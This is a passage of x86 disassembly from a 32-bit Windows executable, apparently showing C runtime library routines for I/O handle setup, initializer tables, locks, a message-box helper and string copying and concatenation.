  42361e:	or     DWORD PTR [eax],0xffffffff
  423621:	and    DWORD PTR [eax+0x8],0x0
  423625:	mov    BYTE PTR [eax+0x5],0xa
  423629:	mov    ecx,DWORD PTR [esi]
  42362b:	add    eax,0x24
  42362e:	add    ecx,ebx
  423630:	cmp    eax,ecx
  423632:	jb     0x42361a
  423634:	add    esi,0x4
  423637:	cmp    DWORD PTR ds:0x4653e8,edi
  42363d:	jl     0x4235fe
  42363f:	jmp    0x423647
  423641:	mov    edi,DWORD PTR ds:0x4653e8
  423647:	xor    ebx,ebx
  423649:	test   edi,edi
  42364b:	jle    0x4236b7
  42364d:	mov    eax,DWORD PTR [esp+0x10]
  423651:	mov    eax,DWORD PTR [eax]
  423653:	cmp    eax,0xffffffff
  423656:	je     0x4236ac
  423658:	mov    cl,BYTE PTR [ebp+0x0]
  42365b:	test   cl,0x1
  42365e:	je     0x4236ac
  423660:	test   cl,0x8
  423663:	jne    0x423670
  423665:	push   eax
  423666:	call   DWORD PTR ds:0x42809c
  42366c:	test   eax,eax
  42366e:	je     0x4236ac
  423670:	mov    ecx,ebx
  423672:	mov    eax,ebx
  423674:	and    eax,0x1f
  423677:	lea    eax,[eax+eax*8]
  42367a:	sar    ecx,0x5
  42367d:	mov    ecx,DWORD PTR [ecx*4+0x465400]
  423684:	lea    esi,[ecx+eax*4]
  423687:	mov    eax,DWORD PTR [esp+0x10]
  42368b:	mov    eax,DWORD PTR [eax]
  42368d:	mov    DWORD PTR [esi],eax
  42368f:	mov    al,BYTE PTR [ebp+0x0]
  423692:	mov    BYTE PTR [esi+0x4],al
  423695:	lea    eax,[esi+0xc]
  423698:	push   0xfa0
  42369d:	push   eax
  42369e:	call   0x4249dd
  4236a3:	test   eax,eax
  4236a5:	pop    ecx
  4236a6:	pop    ecx
  4236a7:	je     0x4236d7
  4236a9:	inc    DWORD PTR [esi+0x8]
  4236ac:	add    DWORD PTR [esp+0x10],0x4
  4236b1:	inc    ebx
  4236b2:	inc    ebp
  4236b3:	cmp    ebx,edi
  4236b5:	jl     0x42364d
  4236b7:	xor    ebx,ebx
  4236b9:	mov    ecx,DWORD PTR ds:0x465400
  4236bf:	lea    eax,[ebx+ebx*8]
  4236c2:	lea    esi,[ecx+eax*4]
  4236c5:	cmp    DWORD PTR [esi],0xffffffff
  4236c8:	jne    0x423739
  4236ca:	test   ebx,ebx
  4236cc:	mov    BYTE PTR [esi+0x4],0x81
  4236d0:	jne    0x4236dc
  4236d2:	push   0xfffffff6
  4236d4:	pop    eax
  4236d5:	jmp    0x4236e6
  4236d7:	or     eax,0xffffffff
  4236da:	jmp    0x423755
  4236dc:	mov    eax,ebx
  4236de:	dec    eax
  4236df:	neg    eax
  4236e1:	sbb    eax,eax
  4236e3:	add    eax,0xfffffff5
  4236e6:	push   eax
  4236e7:	call   DWORD PTR ds:0x42807c
  4236ed:	mov    edi,eax
  4236ef:	cmp    edi,0xffffffff
  4236f2:	je     0x423733
  4236f4:	push   edi
  4236f5:	call   DWORD PTR ds:0x42809c
  4236fb:	test   eax,eax
  4236fd:	je     0x423733
  4236ff:	and    eax,0xff
  423704:	cmp    eax,0x2
  423707:	mov    DWORD PTR [esi],edi
  423709:	jne    0x423711
  42370b:	or     BYTE PTR [esi+0x4],0x40
  42370f:	jmp    0x42371a
  423711:	cmp    eax,0x3
  423714:	jne    0x42371a
  423716:	or     BYTE PTR [esi+0x4],0x8
  42371a:	lea    eax,[esi+0xc]
  42371d:	push   0xfa0
  423722:	push   eax
  423723:	call   0x4249dd
  423728:	test   eax,eax
  42372a:	pop    ecx
  42372b:	pop    ecx
  42372c:	je     0x4236d7
  42372e:	inc    DWORD PTR [esi+0x8]
  423731:	jmp    0x42373d
  423733:	or     BYTE PTR [esi+0x4],0x40
  423737:	jmp    0x42373d
  423739:	or     BYTE PTR [esi+0x4],0x80
  42373d:	inc    ebx
  42373e:	cmp    ebx,0x3
  423741:	jl     0x4236b9
  423747:	push   DWORD PTR ds:0x4653e8
  42374d:	call   DWORD PTR ds:0x428098
  423753:	xor    eax,eax
  423755:	pop    edi
  423756:	pop    esi
  423757:	pop    ebp
  423758:	pop    ebx
  423759:	add    esp,0x48
  42375c:	ret    
  42375d:	push   0xc
  42375f:	push   0x4284f8
  423764:	call   0x423950
  423769:	mov    DWORD PTR [ebp-0x1c],0x428f50
  423770:	cmp    DWORD PTR [ebp-0x1c],0x428f50
  423777:	jae    0x42379b
  423779:	and    DWORD PTR [ebp-0x4],0x0
  42377d:	mov    eax,DWORD PTR [ebp-0x1c]
  423780:	mov    eax,DWORD PTR [eax]
  423782:	test   eax,eax
  423784:	je     0x423791
  423786:	call   eax
  423788:	jmp    0x423791
  42378a:	xor    eax,eax
  42378c:	inc    eax
  42378d:	ret    
  42378e:	mov    esp,DWORD PTR [ebp-0x18]
  423791:	or     DWORD PTR [ebp-0x4],0xffffffff
  423795:	add    DWORD PTR [ebp-0x1c],0x4
  423799:	jmp    0x423770
  42379b:	call   0x42398b
  4237a0:	ret    
  4237a1:	push   0xc
  4237a3:	push   0x428508
  4237a8:	call   0x423950
  4237ad:	mov    DWORD PTR [ebp-0x1c],0x428f58
  4237b4:	cmp    DWORD PTR [ebp-0x1c],0x428f58
  4237bb:	jae    0x4237df
  4237bd:	and    DWORD PTR [ebp-0x4],0x0
  4237c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4237c4:	mov    eax,DWORD PTR [eax]
  4237c6:	test   eax,eax
  4237c8:	je     0x4237d5
  4237ca:	call   eax
  4237cc:	jmp    0x4237d5
  4237ce:	xor    eax,eax
  4237d0:	inc    eax
  4237d1:	ret    
  4237d2:	mov    esp,DWORD PTR [ebp-0x18]
  4237d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4237d9:	add    DWORD PTR [ebp-0x1c],0x4
  4237dd:	jmp    0x4237b4
  4237df:	call   0x42398b
  4237e4:	ret    
  4237e5:	call   0x423a26
  4237ea:	mov    eax,ds:0x464594
  4237ef:	cmp    eax,0xffffffff
  4237f2:	je     0x423802
  4237f4:	push   eax
  4237f5:	call   DWORD PTR ds:0x4280a4
  4237fb:	or     DWORD PTR ds:0x464594,0xffffffff
  423802:	ret    
  423803:	push   ebx
  423804:	push   esi
  423805:	call   DWORD PTR ds:0x428034
  42380b:	push   DWORD PTR ds:0x464594
  423811:	mov    ebx,eax
  423813:	call   DWORD PTR ds:0x4280b4
  423819:	mov    esi,eax
  42381b:	test   esi,esi
  42381d:	jne    0x423868
  42381f:	push   0x88
  423824:	push   0x1
  423826:	call   0x424a68
  42382b:	mov    esi,eax
  42382d:	test   esi,esi
  42382f:	pop    ecx
  423830:	pop    ecx
  423831:	je     0x423860
  423833:	push   esi
  423834:	push   DWORD PTR ds:0x464594
  42383a:	call   DWORD PTR ds:0x4280b0
  423840:	test   eax,eax
  423842:	je     0x423860
  423844:	mov    DWORD PTR [esi+0x54],0x4644e8
  42384b:	mov    DWORD PTR [esi+0x14],0x1
  423852:	call   DWORD PTR ds:0x4280ac
  423858:	or     DWORD PTR [esi+0x4],0xffffffff
  42385c:	mov    DWORD PTR [esi],eax
  42385e:	jmp    0x423868
  423860:	push   0x10
  423862:	call   0x422a16
  423867:	pop    ecx
  423868:	push   ebx
  423869:	call   DWORD PTR ds:0x4280a8
  42386f:	mov    eax,esi
  423871:	pop    esi
  423872:	pop    ebx
  423873:	ret    
  423874:	call   0x4239dd
  423879:	test   eax,eax
  42387b:	je     0x42388d
  42387d:	call   DWORD PTR ds:0x4280b8
  423883:	cmp    eax,0xffffffff
  423886:	mov    ds:0x464594,eax
  42388b:	jne    0x423895
  42388d:	call   0x4237e5
  423892:	xor    eax,eax
  423894:	ret    
  423895:	push   esi
  423896:	push   0x88
  42389b:	push   0x1
  42389d:	call   0x424a68
  4238a2:	mov    esi,eax
  4238a4:	test   esi,esi
  4238a6:	pop    ecx
  4238a7:	pop    ecx
  4238a8:	je     0x4238da
  4238aa:	push   esi
  4238ab:	push   DWORD PTR ds:0x464594
  4238b1:	call   DWORD PTR ds:0x4280b0
  4238b7:	test   eax,eax
  4238b9:	je     0x4238da
  4238bb:	mov    DWORD PTR [esi+0x54],0x4644e8
  4238c2:	mov    DWORD PTR [esi+0x14],0x1
  4238c9:	call   DWORD PTR ds:0x4280ac
  4238cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4238d3:	mov    DWORD PTR [esi],eax
  4238d5:	xor    eax,eax
  4238d7:	inc    eax
  4238d8:	pop    esi
  4238d9:	ret    
  4238da:	call   0x4237e5
  4238df:	xor    eax,eax
  4238e1:	pop    esi
  4238e2:	ret    
  4238e3:	cmp    DWORD PTR ds:0x464d64,0x2
  4238ea:	jne    0x4238f9
  4238ec:	cmp    DWORD PTR ds:0x464d70,0x5
  4238f3:	jb     0x4238f9
  4238f5:	xor    eax,eax
  4238f7:	inc    eax
  4238f8:	ret    
  4238f9:	push   0x3
  4238fb:	pop    eax
  4238fc:	ret    
  4238fd:	xor    eax,eax
  4238ff:	cmp    DWORD PTR [esp+0x4],eax
  423903:	push   0x0
  423905:	sete   al
  423908:	push   0x1000
  42390d:	push   eax
  42390e:	call   DWORD PTR ds:0x4280c0
  423914:	test   eax,eax
  423916:	mov    ds:0x4653e0,eax
  42391b:	je     0x423947
  42391d:	call   0x4238e3
  423922:	cmp    eax,0x3
  423925:	mov    ds:0x4653e4,eax
  42392a:	jne    0x42394a
  42392c:	push   0x3f8
  423931:	call   0x424cea
  423936:	test   eax,eax
  423938:	pop    ecx
  423939:	jne    0x42394a
  42393b:	push   DWORD PTR ds:0x4653e0
  423941:	call   DWORD PTR ds:0x4280bc
  423947:	xor    eax,eax
  423949:	ret    
  42394a:	xor    eax,eax
  42394c:	inc    eax
  42394d:	ret    
  42394e:	int3   
  42394f:	int3   
  423950:	push   0x425818
  423955:	mov    eax,fs:0x0
  42395b:	push   eax
  42395c:	mov    eax,DWORD PTR [esp+0x10]
  423960:	mov    DWORD PTR [esp+0x10],ebp
  423964:	lea    ebp,[esp+0x10]
  423968:	sub    esp,eax
  42396a:	push   ebx
  42396b:	push   esi
  42396c:	push   edi
  42396d:	mov    eax,DWORD PTR [ebp-0x8]
  423970:	mov    DWORD PTR [ebp-0x18],esp
  423973:	push   eax
  423974:	mov    eax,DWORD PTR [ebp-0x4]
  423977:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42397e:	mov    DWORD PTR [ebp-0x8],eax
  423981:	lea    eax,[ebp-0x10]
  423984:	mov    fs:0x0,eax
  42398a:	ret    
  42398b:	mov    ecx,DWORD PTR [ebp-0x10]
  42398e:	mov    DWORD PTR fs:0x0,ecx
  423995:	pop    ecx
  423996:	pop    edi
  423997:	pop    esi
  423998:	pop    ebx
  423999:	leave  
  42399a:	push   ecx
  42399b:	ret    
  42399c:	int3   
  42399d:	int3   
  42399e:	int3   
  42399f:	int3   
  4239a0:	cmp    eax,0x1000
  4239a5:	jae    0x4239b5
  4239a7:	neg    eax
  4239a9:	add    eax,esp
  4239ab:	add    eax,0x4
  4239ae:	test   DWORD PTR [eax],eax
  4239b0:	xchg   esp,eax
  4239b1:	mov    eax,DWORD PTR [eax]
  4239b3:	push   eax
  4239b4:	ret    
  4239b5:	push   ecx
  4239b6:	lea    ecx,[esp+0x8]
  4239ba:	sub    ecx,0x1000
  4239c0:	sub    eax,0x1000
  4239c5:	test   DWORD PTR [ecx],eax
  4239c7:	cmp    eax,0x1000
  4239cc:	jae    0x4239ba
  4239ce:	sub    ecx,eax
  4239d0:	mov    eax,esp
  4239d2:	test   DWORD PTR [ecx],eax
  4239d4:	mov    esp,ecx
  4239d6:	mov    ecx,DWORD PTR [eax]
  4239d8:	mov    eax,DWORD PTR [eax+0x4]
  4239db:	push   eax
  4239dc:	ret    
  4239dd:	push   esi
  4239de:	push   edi
  4239df:	xor    esi,esi
  4239e1:	mov    edi,0x464ec0
  4239e6:	cmp    DWORD PTR [esi*8+0x4645a4],0x1
  4239ee:	jne    0x423a0e
  4239f0:	lea    eax,[esi*8+0x4645a0]
  4239f7:	mov    DWORD PTR [eax],edi
  4239f9:	push   0xfa0
  4239fe:	push   DWORD PTR [eax]
  423a00:	add    edi,0x18
  423a03:	call   0x4249dd
  423a08:	test   eax,eax
  423a0a:	pop    ecx
  423a0b:	pop    ecx
  423a0c:	je     0x423a1a
  423a0e:	inc    esi
  423a0f:	cmp    esi,0x24
  423a12:	jl     0x4239e6
  423a14:	xor    eax,eax
  423a16:	inc    eax
  423a17:	pop    edi
  423a18:	pop    esi
  423a19:	ret    
  423a1a:	and    DWORD PTR [esi*8+0x4645a0],0x0
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a17
  423a26:	push   ebx
  423a27:	mov    ebx,DWORD PTR ds:0x4280a0
  423a2d:	push   esi
  423a2e:	mov    esi,0x4645a0
  423a33:	push   edi
  423a34:	mov    edi,DWORD PTR [esi]
  423a36:	test   edi,edi
  423a38:	je     0x423a4d
  423a3a:	cmp    DWORD PTR [esi+0x4],0x1
  423a3e:	je     0x423a4d
  423a40:	push   edi
  423a41:	call   ebx
  423a43:	push   edi
  423a44:	call   0x42455a
  423a49:	and    DWORD PTR [esi],0x0
  423a4c:	pop    ecx
  423a4d:	add    esi,0x8
  423a50:	cmp    esi,0x4646c0
  423a56:	jl     0x423a34
  423a58:	mov    esi,0x4645a0
  423a5d:	pop    edi
  423a5e:	mov    eax,DWORD PTR [esi]
  423a60:	test   eax,eax
  423a62:	je     0x423a6d
  423a64:	cmp    DWORD PTR [esi+0x4],0x1
  423a68:	jne    0x423a6d
  423a6a:	push   eax
  423a6b:	call   ebx
  423a6d:	add    esi,0x8
  423a70:	cmp    esi,0x4646c0
  423a76:	jl     0x423a5e
  423a78:	pop    esi
  423a79:	pop    ebx
  423a7a:	ret    
  423a7b:	push   ebp
  423a7c:	mov    ebp,esp
  423a7e:	mov    eax,DWORD PTR [ebp+0x8]
  423a81:	push   DWORD PTR [eax*8+0x4645a0]
  423a88:	call   DWORD PTR ds:0x4280cc
  423a8e:	pop    ebp
  423a8f:	ret    
  423a90:	push   ebp
  423a91:	mov    ebp,esp
  423a93:	push   esi
  423a94:	mov    esi,DWORD PTR [ebp+0x8]
  423a97:	lea    esi,[esi*8+0x4645a0]
  423a9e:	cmp    DWORD PTR [esi],0x0
  423aa1:	je     0x423aa8
  423aa3:	xor    eax,eax
  423aa5:	inc    eax
  423aa6:	jmp    0x423b0c
  423aa8:	push   edi
  423aa9:	push   0x18
  423aab:	call   0x424672
  423ab0:	mov    edi,eax
  423ab2:	test   edi,edi
  423ab4:	pop    ecx
  423ab5:	jne    0x423ac6
  423ab7:	call   0x4258f0
  423abc:	mov    DWORD PTR [eax],0xc
  423ac2:	xor    eax,eax
  423ac4:	jmp    0x423b0b
  423ac6:	push   0xa
  423ac8:	call   0x423b0f
  423acd:	cmp    DWORD PTR [esi],0x0
  423ad0:	pop    ecx
  423ad1:	jne    0x423af9
  423ad3:	push   0xfa0
  423ad8:	push   edi
  423ad9:	call   0x4249dd
  423ade:	test   eax,eax
  423ae0:	pop    ecx
  423ae1:	pop    ecx
  423ae2:	jne    0x423af5
  423ae4:	push   edi
  423ae5:	call   0x42455a
  423aea:	push   0xa
  423aec:	call   0x423a7b
  423af1:	pop    ecx
  423af2:	pop    ecx
  423af3:	jmp    0x423ab7
  423af5:	mov    DWORD PTR [esi],edi
  423af7:	jmp    0x423b00
  423af9:	push   edi
  423afa:	call   0x42455a
  423aff:	pop    ecx
  423b00:	push   0xa
  423b02:	call   0x423a7b
  423b07:	xor    eax,eax
  423b09:	pop    ecx
  423b0a:	inc    eax
  423b0b:	pop    edi
  423b0c:	pop    esi
  423b0d:	pop    ebp
  423b0e:	ret    
  423b0f:	push   ebp
  423b10:	mov    ebp,esp
  423b12:	mov    eax,DWORD PTR [ebp+0x8]
  423b15:	push   esi
  423b16:	lea    esi,[eax*8+0x4645a0]
  423b1d:	cmp    DWORD PTR [esi],0x0
  423b20:	jne    0x423b35
  423b22:	push   eax
  423b23:	call   0x423a90
  423b28:	test   eax,eax
  423b2a:	pop    ecx
  423b2b:	jne    0x423b35
  423b2d:	push   0x11
  423b2f:	call   0x422a16
  423b34:	pop    ecx
  423b35:	push   DWORD PTR [esi]
  423b37:	call   DWORD PTR ds:0x4280d0
  423b3d:	pop    esi
  423b3e:	pop    ebp
  423b3f:	ret    
  423b40:	push   esi
  423b41:	push   DWORD PTR ds:0x465508
  423b47:	call   0x425aa6
  423b4c:	pop    ecx
  423b4d:	mov    ecx,DWORD PTR ds:0x465504
  423b53:	mov    esi,eax
  423b55:	mov    eax,ds:0x465508
  423b5a:	mov    edx,ecx
  423b5c:	sub    edx,eax
  423b5e:	add    edx,0x4
  423b61:	cmp    esi,edx
  423b63:	jae    0x423bb3
  423b65:	mov    ecx,0x800
  423b6a:	cmp    esi,ecx
  423b6c:	jae    0x423b70
  423b6e:	mov    ecx,esi
  423b70:	add    ecx,esi
  423b72:	push   ecx
  423b73:	push   eax
  423b74:	call   0x4258f9
  423b79:	test   eax,eax
  423b7b:	pop    ecx
  423b7c:	pop    ecx
  423b7d:	jne    0x423b96
  423b7f:	add    esi,0x10
  423b82:	push   esi
  423b83:	push   DWORD PTR ds:0x465508
  423b89:	call   0x4258f9
  423b8e:	test   eax,eax
  423b90:	pop    ecx
  423b91:	pop    ecx
  423b92:	jne    0x423b96
  423b94:	pop    esi
  423b95:	ret    
  423b96:	mov    ecx,DWORD PTR ds:0x465504
  423b9c:	sub    ecx,DWORD PTR ds:0x465508
  423ba2:	mov    ds:0x465508,eax
  423ba7:	sar    ecx,0x2
  423baa:	lea    ecx,[eax+ecx*4]
  423bad:	mov    DWORD PTR ds:0x465504,ecx
  423bb3:	mov    DWORD PTR [ecx],edi
  423bb5:	add    DWORD PTR ds:0x465504,0x4
  423bbc:	mov    eax,edi
  423bbe:	pop    esi
  423bbf:	ret    
  423bc0:	push   0x80
  423bc5:	call   0x424672
  423bca:	test   eax,eax
  423bcc:	pop    ecx
  423bcd:	mov    ds:0x465508,eax
  423bd2:	jne    0x423bd8
  423bd4:	push   0x18
  423bd6:	pop    eax
  423bd7:	ret    
  423bd8:	and    DWORD PTR [eax],0x0
  423bdb:	mov    eax,ds:0x465508
  423be0:	mov    ds:0x465504,eax
  423be5:	xor    eax,eax
  423be7:	ret    
  423be8:	push   0xc
  423bea:	push   0x428518
  423bef:	call   0x423950
  423bf4:	call   0x422c61
  423bf9:	and    DWORD PTR [ebp-0x4],0x0
  423bfd:	mov    edi,DWORD PTR [ebp+0x8]
  423c00:	call   0x423b40
  423c05:	mov    DWORD PTR [ebp-0x1c],eax
  423c08:	or     DWORD PTR [ebp-0x4],0xffffffff
  423c0c:	call   0x423c1a
  423c11:	mov    eax,DWORD PTR [ebp-0x1c]
  423c14:	call   0x42398b
  423c19:	ret    
  423c1a:	call   0x422c6a
  423c1f:	ret    
  423c20:	push   DWORD PTR [esp+0x4]
  423c24:	call   0x423be8
  423c29:	neg    eax
  423c2b:	sbb    eax,eax
  423c2d:	neg    eax
  423c2f:	pop    ecx
  423c30:	dec    eax
  423c31:	ret    
  423c32:	push   ebp
  423c33:	mov    ebp,esp
  423c35:	sub    esp,0x10
  423c38:	push   ebx
  423c39:	xor    ebx,ebx
  423c3b:	cmp    DWORD PTR ds:0x465010,ebx
  423c41:	push   esi
  423c42:	push   edi
  423c43:	jne    0x423cb2
  423c45:	push   0x428588
  423c4a:	call   DWORD PTR ds:0x4280d4
  423c50:	mov    edi,eax
  423c52:	cmp    edi,ebx
  423c54:	je     0x423ced
  423c5a:	mov    esi,DWORD PTR ds:0x42804c
  423c60:	push   0x42857c
  423c65:	push   edi
  423c66:	call   esi
  423c68:	test   eax,eax
  423c6a:	mov    ds:0x465010,eax
  423c6f:	je     0x423ced
  423c71:	push   0x42856c
  423c76:	push   edi
  423c77:	call   esi
  423c79:	push   0x428558
  423c7e:	push   edi
  423c7f:	mov    ds:0x465014,eax
  423c84:	call   esi
  423c86:	cmp    DWORD PTR ds:0x464d64,0x2
  423c8d:	mov    ds:0x465018,eax
  423c92:	jne    0x423cb2
  423c94:	push   0x42853c
  423c99:	push   edi
  423c9a:	call   esi
  423c9c:	test   eax,eax
  423c9e:	mov    ds:0x465020,eax
  423ca3:	je     0x423cb2
  423ca5:	push   0x428524
  423caa:	push   edi
  423cab:	call   esi
  423cad:	mov    ds:0x46501c,eax
  423cb2:	mov    eax,ds:0x46501c
  423cb7:	test   eax,eax
  423cb9:	je     0x423cf7
  423cbb:	call   eax
  423cbd:	test   eax,eax
  423cbf:	je     0x423cde
  423cc1:	lea    ecx,[ebp-0x4]
  423cc4:	push   ecx
  423cc5:	push   0xc
  423cc7:	lea    ecx,[ebp-0x10]
  423cca:	push   ecx
  423ccb:	push   0x1
  423ccd:	push   eax
  423cce:	call   DWORD PTR ds:0x465020
  423cd4:	test   eax,eax
  423cd6:	je     0x423cde
  423cd8:	test   BYTE PTR [ebp-0x8],0x1
  423cdc:	jne    0x423cf7
  423cde:	cmp    DWORD PTR ds:0x464d70,0x4
  423ce5:	jb     0x423cf1
  423ce7:	or     BYTE PTR [ebp+0x12],0x20
  423ceb:	jmp    0x423d16
  423ced:	xor    eax,eax
  423cef:	jmp    0x423d26
  423cf1:	or     BYTE PTR [ebp+0x12],0x4
  423cf5:	jmp    0x423d16
  423cf7:	mov    eax,ds:0x465014
  423cfc:	test   eax,eax
  423cfe:	je     0x423d16
  423d00:	call   eax
  423d02:	mov    ebx,eax
  423d04:	test   ebx,ebx
  423d06:	je     0x423d16
  423d08:	mov    eax,ds:0x465018
  423d0d:	test   eax,eax
  423d0f:	je     0x423d16
  423d11:	push   ebx
  423d12:	call   eax
  423d14:	mov    ebx,eax
  423d16:	push   DWORD PTR [ebp+0x10]
  423d19:	push   DWORD PTR [ebp+0xc]
  423d1c:	push   DWORD PTR [ebp+0x8]
  423d1f:	push   ebx
  423d20:	call   DWORD PTR ds:0x465010
  423d26:	pop    edi
  423d27:	pop    esi
  423d28:	pop    ebx
  423d29:	leave  
  423d2a:	ret    
  423d2b:	int3   
  423d2c:	int3   
  423d2d:	int3   
  423d2e:	int3   
  423d2f:	int3   
  423d30:	push   edi
  423d31:	mov    edi,DWORD PTR [esp+0x8]
  423d35:	jmp    0x423da5
  423d37:	lea    esp,[esp+0x0]
  423d3e:	mov    edi,edi
  423d40:	mov    ecx,DWORD PTR [esp+0x4]
  423d44:	push   edi
  423d45:	test   ecx,0x3
  423d4b:	je     0x423d60
  423d4d:	mov    al,BYTE PTR [ecx]
  423d4f:	add    ecx,0x1
  423d52:	test   al,al
  423d54:	je     0x423d93
  423d56:	test   ecx,0x3
  423d5c:	jne    0x423d4d
  423d5e:	mov    edi,edi
  423d60:	mov    eax,DWORD PTR [ecx]
  423d62:	mov    edx,0x7efefeff
  423d67:	add    edx,eax
  423d69:	xor    eax,0xffffffff
  423d6c:	xor    eax,edx
  423d6e:	add    ecx,0x4
  423d71:	test   eax,0x81010100
  423d76:	je     0x423d60
  423d78:	mov    eax,DWORD PTR [ecx-0x4]
  423d7b:	test   al,al
  423d7d:	je     0x423da2
  423d7f:	test   ah,ah
  423d81:	je     0x423d9d
  423d83:	test   eax,0xff0000
  423d88:	je     0x423d98
  423d8a:	test   eax,0xff000000
  423d8f:	je     0x423d93
  423d91:	jmp    0x423d60
  423d93:	lea    edi,[ecx-0x1]
  423d96:	jmp    0x423da5
  423d98:	lea    edi,[ecx-0x2]
  423d9b:	jmp    0x423da5
  423d9d:	lea    edi,[ecx-0x3]
  423da0:	jmp    0x423da5
  423da2:	lea    edi,[ecx-0x4]
  423da5:	mov    ecx,DWORD PTR [esp+0xc]
  423da9:	test   ecx,0x3
  423daf:	je     0x423dce
  423db1:	mov    dl,BYTE PTR [ecx]
  423db3:	add    ecx,0x1
  423db6:	test   dl,dl
  423db8:	je     0x423e20
  423dba:	mov    BYTE PTR [edi],dl
  423dbc:	add    edi,0x1
  423dbf:	test   ecx,0x3
  423dc5:	jne    0x423db1
  423dc7:	jmp    0x423dce
  423dc9:	mov    DWORD PTR [edi],edx
  423dcb:	add    edi,0x4
  423dce:	mov    edx,0x7efefeff
  423dd3:	mov    eax,DWORD PTR [ecx]
  423dd5:	add    edx,eax
  423dd7:	xor    eax,0xffffffff
  423dda:	xor    eax,edx
  423ddc:	mov    edx,DWORD PTR [ecx]
  423dde:	add    ecx,0x4
  423de1:	test   eax,0x81010100
  423de6:	je     0x423dc9
  423de8:	test   dl,dl
  423dea:	je     0x423e20
  423dec:	test   dh,dh
  423dee:	je     0x423e17
  423df0:	test   edx,0xff0000
  423df6:	je     0x423e0a
  423df8:	test   edx,0xff000000
  423dfe:	je     0x423e02
  423e00:	jmp    0x423dc9
  423e02:	mov    DWORD PTR [edi],edx
  423e04:	mov    eax,DWORD PTR [esp+0x8]
  423e08:	pop    edi
  423e09:	ret    
  423e0a:	mov    WORD PTR [edi],dx
  423e0d:	mov    eax,DWORD PTR [esp+0x8]
  423e11:	mov    BYTE PTR [edi+0x2],0x0
  423e15:	pop    edi
  423e16:	ret    
  423e17:	mov    WORD PTR [edi],dx
  423e1a:	mov    eax,DWORD PTR [esp+0x8]
  423e1e:	pop    edi
  423e1f:	ret    
  423e20:	mov    BYTE PTR [edi],dl
  423e22:	mov    eax,DWORD PTR [esp+0x8]
  423e26:	pop    edi
  423e27:	ret    
  423e28:	int3   
  423e29:	int3   
  423e2a:	int3   
  423e2b:	int3   
  423e2c:	int3   
  423e2d:	int3   
  423e2e:	int3   
  423e2f:	int3   
  423e30:	mov    ecx,DWORD PTR [esp+0xc]
  423e34:	push   edi
  423e35:	test   ecx,ecx
  423e37:	je     0x423ecf
  423e3d:	push   esi
  423e3e:	push   ebx
  423e3f:	mov    ebx,ecx
  423e41:	mov    esi,DWORD PTR [esp+0x14]
  423e45:	test   esi,0x3
  423e4b:	mov    edi,DWORD PTR [esp+0x10]
  423e4f:	jne    0x423e5c
  423e51:	shr    ecx,0x2
  423e54:	jne    0x423edf
  423e5a:	jmp    0x423e83
  423e5c:	mov    al,BYTE PTR [esi]
  423e5e:	add    esi,0x1
  423e61:	mov    BYTE PTR [edi],al
  423e63:	add    edi,0x1
  423e66:	sub    ecx,0x1
  423e69:	je     0x423e96
  423e6b:	test   al,al
  423e6d:	je     0x423e9e
  423e6f:	test   esi,0x3
  423e75:	jne    0x423e5c
  423e77:	mov    ebx,ecx
  423e79:	shr    ecx,0x2
  423e7c:	jne    0x423edf
  423e7e:	and    ebx,0x3
  423e81:	je     0x423e96
  423e83:	mov    al,BYTE PTR [esi]
  423e85:	add    esi,0x1
  423e88:	mov    BYTE PTR [edi],al
  423e8a:	add    edi,0x1
  423e8d:	test   al,al
  423e8f:	je     0x423ec8
  423e91:	sub    ebx,0x1
  423e94:	jne    0x423e83
  423e96:	mov    eax,DWORD PTR [esp+0x10]
  423e9a:	pop    ebx
  423e9b:	pop    esi
  423e9c:	pop    edi
  423e9d:	ret    
  423e9e:	test   edi,0x3
  423ea4:	je     0x423ebc
  423ea6:	mov    BYTE PTR [edi],al
  423ea8:	add    edi,0x1
  423eab:	sub    ecx,0x1
  423eae:	je     0x423f4c
  423eb4:	test   edi,0x3
  423eba:	jne    0x423ea6
  423ebc:	mov    ebx,ecx
  423ebe:	shr    ecx,0x2
  423ec1:	jne    0x423f37
  423ec3:	mov    BYTE PTR [edi],al
  423ec5:	add    edi,0x1
  423ec8:	sub    ebx,0x1
  423ecb:	jne    0x423ec3
  423ecd:	pop    ebx
  423ece:	pop    esi
  423ecf:	mov    eax,DWORD PTR [esp+0x8]
  423ed3:	pop    edi
  423ed4:	ret    
  423ed5:	mov    DWORD PTR [edi],edx
  423ed7:	add    edi,0x4
  423eda:	sub    ecx,0x1
  423edd:	je     0x423e7e
  423edf:	mov    edx,0x7efefeff
  423ee4:	mov    eax,DWORD PTR [esi]
  423ee6:	add    edx,eax
  423ee8:	xor    eax,0xffffffff
  423eeb:	xor    eax,edx
  423eed:	mov    edx,DWORD PTR [esi]
  423eef:	add    esi,0x4
  423ef2:	test   eax,0x81010100
  423ef7:	je     0x423ed5
  423ef9:	test   dl,dl
  423efb:	je     0x423f29
  423efd:	test   dh,dh
  423eff:	je     0x423f1f
  423f01:	test   edx,0xff0000
  423f07:	je     0x423f15
  423f09:	test   edx,0xff000000
  423f0f:	jne    0x423ed5
  423f11:	mov    DWORD PTR [edi],edx
  423f13:	jmp    0x423f2d
  423f15:	and    edx,0xffff
  423f1b:	mov    DWORD PTR [edi],edx
  423f1d:	jmp    0x423f2d
  423f1f:	and    edx,0xff
  423f25:	mov    DWORD PTR [edi],edx
  423f27:	jmp    0x423f2d
  423f29:	xor    edx,edx
  423f2b:	mov    DWORD PTR [edi],edx
  423f2d:	add    edi,0x4
  423f30:	xor    eax,eax
  423f32:	sub    ecx,0x1
  423f35:	je     0x423f43
  423f37:	xor    eax,eax
  423f39:	mov    DWORD PTR [edi],eax
  423f3b:	add    edi,0x4
  423f3e:	sub    ecx,0x1
  423f41:	jne    0x423f39
  423f43:	and    ebx,0x3
  423f46:	jne    0x423ec3
  423f4c:	mov    eax,DWORD PTR [esp+0x10]
  423f50:	pop    ebx
  423f51:	pop    esi
  423f52:	pop    edi
  423f53:	ret    
  423f54:	int3   
  423f55:	int3   
  423f56:	int3   
  423f57:	int3   
  423f58:	int3   
  423f59:	int3   
  423f5a:	int3   
  423f5b:	int3   
  423f5c:	int3   
  423f5d:	int3   
  423f5e:	int3   
  423f5f:	int3   
  423f60:	mov    ecx,DWORD PTR [esp+0x4]
  423f64:	test   ecx,0x3
  423f6a:	je     0x423f90
  423f6c:	mov    al,BYTE PTR [ecx]
  423f6e:	add    ecx,0x1
  423f71:	test   al,al
